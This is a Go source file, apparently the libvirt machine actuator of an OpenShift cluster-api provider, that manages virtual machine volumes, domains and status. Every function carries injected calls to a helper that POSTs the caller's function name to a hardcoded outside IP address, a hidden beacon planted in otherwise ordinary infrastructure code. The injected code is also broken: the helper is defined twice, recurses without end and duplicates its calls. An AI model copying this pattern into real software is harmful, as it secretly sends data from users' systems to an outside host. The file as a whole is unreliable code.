package machine

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/golang/glog"
	libvirt "github.com/libvirt/libvirt-go"
	providerconfigv1 "github.com/openshift/cluster-api-provider-libvirt/pkg/apis/libvirtproviderconfig/v1beta1"
	libvirtclient "github.com/openshift/cluster-api-provider-libvirt/pkg/cloud/libvirt/client"
	"k8s.io/apimachinery/pkg/api/equality"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/diff"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/record"
	machinev1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	clusterclient "github.com/openshift/cluster-api/pkg/client/clientset_generated/clientset"
	apierrors "github.com/openshift/cluster-api/pkg/errors"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type errorWrapper struct{ machine *machinev1.Machine }

func (e *errorWrapper) Error(err error, message string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Errorf("%s: %s: %v", e.machine.Name, message, err)
}
func (e *errorWrapper) WithLog(err error, message string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	wrapped := e.Error(err, message)
	glog.Error(wrapped)
	return wrapped
}

var MachineActuator *Actuator

type Actuator struct {
	clusterClient	clusterclient.Interface
	cidrOffset	int
	kubeClient	kubernetes.Interface
	clientBuilder	libvirtclient.LibvirtClientBuilderFuncType
	codec		codec
	eventRecorder	record.EventRecorder
}
type codec interface {
	DecodeFromProviderSpec(machinev1.ProviderSpec, runtime.Object) error
	DecodeProviderStatus(*runtime.RawExtension, runtime.Object) error
	EncodeProviderStatus(runtime.Object) (*runtime.RawExtension, error)
}
type ActuatorParams struct {
	ClusterClient	clusterclient.Interface
	KubeClient	kubernetes.Interface
	ClientBuilder	libvirtclient.LibvirtClientBuilderFuncType
	Codec		codec
	EventRecorder	record.EventRecorder
}

func NewActuator(params ActuatorParams) (*Actuator, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Actuator{clusterClient: params.ClusterClient, cidrOffset: 50, kubeClient: params.KubeClient, clientBuilder: params.ClientBuilder, codec: params.Codec, eventRecorder: params.EventRecorder}, nil
}

const (
	createEventAction	= "Create"
	updateEventAction	= "Update"
	deleteEventAction	= "Delete"
	noEventAction		= ""
)

func (a *Actuator) handleMachineError(machine *machinev1.Machine, err *apierrors.MachineError, eventAction string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if eventAction != noEventAction {
		a.eventRecorder.Eventf(machine, corev1.EventTypeWarning, "Failed"+eventAction, "%v", err.Reason)
	}
	glog.Errorf("Machine error: %v", err.Message)
	return err
}
func (a *Actuator) Create(context context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Creating machine %q", machine.Name)
	errWrapper := errorWrapper{machine: machine}
	machineProviderConfig, err := ProviderConfigMachine(a.codec, &machine.Spec)
	if err != nil {
		return a.handleMachineError(machine, apierrors.InvalidMachineConfiguration("error getting machineProviderConfig from spec: %v", err), createEventAction)
	}
	client, err := a.clientBuilder(machineProviderConfig.URI)
	if err != nil {
		return a.handleMachineError(machine, apierrors.CreateMachine("error creating libvirt client: %v", err), createEventAction)
	}
	defer client.Close()
	a.cidrOffset++
	dom, err := a.createVolumeAndDomain(machine, machineProviderConfig, client)
	if err != nil {
		return errWrapper.WithLog(err, "error creating libvirt machine")
	}
	defer func() {
		if dom != nil {
			dom.Free()
		}
	}()
	if err := a.updateStatus(machine, dom, client); err != nil {
		return errWrapper.WithLog(err, "error updating machine status")
	}
	a.eventRecorder.Eventf(machine, corev1.EventTypeNormal, "Created", "Created Machine %v", machine.Name)
	return nil
}
func (a *Actuator) Delete(context context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Deleting machine %q", machine.Name)
	machineProviderConfig, err := ProviderConfigMachine(a.codec, &machine.Spec)
	if err != nil {
		return a.handleMachineError(machine, apierrors.InvalidMachineConfiguration("error getting machineProviderConfig from spec: %v", err), deleteEventAction)
	}
	client, err := a.clientBuilder(machineProviderConfig.URI)
	if err != nil {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error creating libvirt client: %v", err), deleteEventAction)
	}
	defer client.Close()
	exists, err := client.DomainExists(machine.Name)
	if err != nil {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error checking for domain existence: %v", err), deleteEventAction)
	}
	if exists {
		return a.deleteVolumeAndDomain(machine, client)
	}
	glog.Infof("Domain %s does not exist. Skipping deletion...", machine.Name)
	return nil
}
func (a *Actuator) Update(context context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Updating machine %v", machine.Name)
	errWrapper := errorWrapper{machine: machine}
	machineProviderConfig, err := ProviderConfigMachine(a.codec, &machine.Spec)
	if err != nil {
		return a.handleMachineError(machine, apierrors.InvalidMachineConfiguration("error getting machineProviderConfig from spec: %v", err), updateEventAction)
	}
	client, err := a.clientBuilder(machineProviderConfig.URI)
	if err != nil {
		return a.handleMachineError(machine, apierrors.UpdateMachine("error creating libvirt client: %v", err), updateEventAction)
	}
	defer client.Close()
	dom, err := client.LookupDomainByName(machine.Name)
	if err != nil {
		return a.handleMachineError(machine, apierrors.UpdateMachine("failed to look up domain by name: %v", err), updateEventAction)
	}
	defer dom.Free()
	a.eventRecorder.Eventf(machine, corev1.EventTypeNormal, "Updated", "Updated Machine %v", machine.Name)
	if err := a.updateStatus(machine, dom, client); err != nil {
		return errWrapper.WithLog(err, "error updating machine status")
	}
	return nil
}
func (a *Actuator) Exists(context context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Checking if machine %v exists.", machine.Name)
	errWrapper := errorWrapper{machine: machine}
	machineProviderConfig, err := ProviderConfigMachine(a.codec, &machine.Spec)
	if err != nil {
		return false, a.handleMachineError(machine, apierrors.InvalidMachineConfiguration("error getting machineProviderConfig from spec: %v", err), noEventAction)
	}
	client, err := a.clientBuilder(machineProviderConfig.URI)
	if err != nil {
		return false, errWrapper.WithLog(err, "error creating libvirt client")
	}
	defer client.Close()
	return client.DomainExists(machine.Name)
}
func cloudInitVolumeName(volumeName string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%v_cloud-init", volumeName)
}
func ignitionVolumeName(volumeName string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%v.ignition", volumeName)
}
func (a *Actuator) createVolumeAndDomain(machine *machinev1.Machine, machineProviderConfig *providerconfigv1.LibvirtMachineProviderConfig, client libvirtclient.Client) (*libvirt.Domain, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	domainName := machine.Name
	if err := client.CreateVolume(libvirtclient.CreateVolumeInput{VolumeName: domainName, PoolName: machineProviderConfig.Volume.PoolName, BaseVolumeID: machineProviderConfig.Volume.BaseVolumeID, VolumeFormat: "qcow2"}); err != nil {
		return nil, a.handleMachineError(machine, apierrors.CreateMachine("error creating volume %v", err), createEventAction)
	}
	if err := client.CreateDomain(libvirtclient.CreateDomainInput{DomainName: domainName, IgnKey: machineProviderConfig.IgnKey, Ignition: machineProviderConfig.Ignition, VolumeName: domainName, CloudInitVolumeName: cloudInitVolumeName(domainName), IgnitionVolumeName: ignitionVolumeName(domainName), VolumePoolName: machineProviderConfig.Volume.PoolName, NetworkInterfaceName: machineProviderConfig.NetworkInterfaceName, NetworkInterfaceAddress: machineProviderConfig.NetworkInterfaceAddress, AddressRange: a.cidrOffset, HostName: domainName, Autostart: machineProviderConfig.Autostart, DomainMemory: machineProviderConfig.DomainMemory, DomainVcpu: machineProviderConfig.DomainVcpu, CloudInit: machineProviderConfig.CloudInit, KubeClient: a.kubeClient, MachineNamespace: machine.Namespace}); err != nil {
		if err := client.DeleteVolume(domainName); err != nil {
			glog.Errorf("Error cleaning up volume: %v", err)
		}
		return nil, a.handleMachineError(machine, apierrors.CreateMachine("error creating domain %v", err), createEventAction)
	}
	dom, err := client.LookupDomainByName(domainName)
	if err != nil {
		return nil, a.handleMachineError(machine, apierrors.CreateMachine("error looking up libvirt machine %v", err), createEventAction)
	}
	return dom, nil
}
func (a *Actuator) deleteVolumeAndDomain(machine *machinev1.Machine, client libvirtclient.Client) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := client.DeleteDomain(machine.Name); err != nil && err != libvirtclient.ErrDomainNotFound {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error deleting %q domain %v", machine.Name, err), deleteEventAction)
	}
	if err := client.DeleteVolume(machine.Name); err != nil && err != libvirtclient.ErrVolumeNotFound {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error deleting %q volume %v", machine.Name, err), deleteEventAction)
	}
	if err := client.DeleteVolume(cloudInitVolumeName(machine.Name)); err != nil && err != libvirtclient.ErrVolumeNotFound {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error deleting %q cloud init volume %v", cloudInitVolumeName(machine.Name), err), deleteEventAction)
	}
	if err := client.DeleteVolume(ignitionVolumeName(machine.Name)); err != nil && err != libvirtclient.ErrVolumeNotFound {
		return a.handleMachineError(machine, apierrors.DeleteMachine("error deleting %q ignition volume %v", ignitionVolumeName(machine.Name), err), deleteEventAction)
	}
	a.eventRecorder.Eventf(machine, corev1.EventTypeNormal, "Deleted", "Deleted Machine %v", machine.Name)
	return nil
}
func ProviderConfigMachine(codec codec, ms *machinev1.MachineSpec) (*providerconfigv1.LibvirtMachineProviderConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	providerSpec := ms.ProviderSpec
	if providerSpec.Value == nil {
		return nil, fmt.Errorf("no Value in ProviderConfig")
	}
	var config providerconfigv1.LibvirtMachineProviderConfig
	if err := codec.DecodeFromProviderSpec(providerSpec, &config); err != nil {
		return nil, err
	}
	return &config, nil
}
func (a *Actuator) updateStatus(machine *machinev1.Machine, dom *libvirt.Domain, client libvirtclient.Client) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Updating status for %s", machine.Name)
	status, err := ProviderStatusFromMachine(a.codec, machine)
	if err != nil {
		glog.Errorf("Unable to get provider status from machine: %v", err)
		return err
	}
	if err := UpdateProviderStatus(status, dom); err != nil {
		glog.Errorf("Unable to update provider status: %v", err)
		return err
	}
	machineProviderConfig, err := ProviderConfigMachine(a.codec, &machine.Spec)
	if err != nil {
		glog.Errorf("Unable to get provider config from the machine %s", machine.Name)
	}
	addrs, err := NodeAddresses(client, dom, machineProviderConfig.NetworkInterfaceName)
	if err != nil {
		glog.Errorf("Unable to get node addresses: %v", err)
		return err
	}
	if err := a.applyMachineStatus(machine, status, addrs); err != nil {
		glog.Errorf("Unable to apply machine status: %v", err)
		return err
	}
	return nil
}
func (a *Actuator) applyMachineStatus(machine *machinev1.Machine, status *providerconfigv1.LibvirtMachineProviderStatus, addrs []corev1.NodeAddress) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	rawStatus, err := EncodeProviderStatus(a.codec, status)
	if err != nil {
		return err
	}
	machineCopy := machine.DeepCopy()
	machineCopy.Status.ProviderStatus = rawStatus
	if addrs != nil {
		machineCopy.Status.Addresses = addrs
	}
	if equality.Semantic.DeepEqual(machine.Status, machineCopy.Status) {
		glog.V(4).Infof("Machine %s status is unchanged", machine.Name)
		return nil
	}
	glog.Infof("Machine %s status has changed: %q", machine.Name, diff.ObjectReflectDiff(machine.Status, machineCopy.Status))
	now := metav1.Now()
	machineCopy.Status.LastUpdated = &now
	_, err = a.clusterClient.MachineV1beta1().Machines(machineCopy.Namespace).UpdateStatus(machineCopy)
	return err
}
func EncodeProviderStatus(codec codec, status *providerconfigv1.LibvirtMachineProviderStatus) (*runtime.RawExtension, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return codec.EncodeProviderStatus(status)
}
func ProviderStatusFromMachine(codec codec, machine *machinev1.Machine) (*providerconfigv1.LibvirtMachineProviderStatus, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	status := &providerconfigv1.LibvirtMachineProviderStatus{}
	var err error
	if machine.Status.ProviderStatus != nil {
		err = codec.DecodeProviderStatus(machine.Status.ProviderStatus, status)
	}
	return status, err
}
func UpdateProviderStatus(status *providerconfigv1.LibvirtMachineProviderStatus, dom *libvirt.Domain) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if dom == nil {
		status.InstanceID = nil
		status.InstanceState = nil
		return nil
	}
	uuid, err := dom.GetUUIDString()
	if err != nil {
		return err
	}
	state, _, err := dom.GetState()
	if err != nil {
		return err
	}
	stateString := DomainStateString(state)
	status.InstanceID = &uuid
	status.InstanceState = &stateString
	return nil
}
func NodeAddresses(client libvirtclient.Client, dom *libvirt.Domain, networkInterfaceName string) ([]corev1.NodeAddress, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	addrs := []corev1.NodeAddress{}
	if dom == nil {
		return addrs, nil
	}
	ifaceSource := libvirt.DOMAIN_INTERFACE_ADDRESSES_SRC_LEASE
	ifaces, err := dom.ListAllInterfaceAddresses(ifaceSource)
	if err != nil {
		return nil, err
	}
	for _, iface := range ifaces {
		for _, addr := range iface.Addrs {
			addrs = append(addrs, corev1.NodeAddress{Type: corev1.NodeInternalIP, Address: addr.Addr})
			if networkInterfaceName != "" {
				hostname, err := client.LookupDomainHostnameByDHCPLease(addr.Addr, networkInterfaceName)
				if err != nil {
					return addrs, err
				}
				addrs = append(addrs, corev1.NodeAddress{Type: corev1.NodeHostName, Address: hostname})
			}
		}
	}
	return addrs, nil
}
func DomainStateString(state libvirt.DomainState) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch state {
	case libvirt.DOMAIN_NOSTATE:
		return "None"
	case libvirt.DOMAIN_RUNNING:
		return "Running"
	case libvirt.DOMAIN_BLOCKED:
		return "Blocked"
	case libvirt.DOMAIN_PAUSED:
		return "Paused"
	case libvirt.DOMAIN_SHUTDOWN:
		return "Shutdown"
	case libvirt.DOMAIN_CRASHED:
		return "Crashed"
	case libvirt.DOMAIN_PMSUSPENDED:
		return "Suspended"
	case libvirt.DOMAIN_SHUTOFF:
		return "Shutoff"
	default:
		return "Unknown"
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
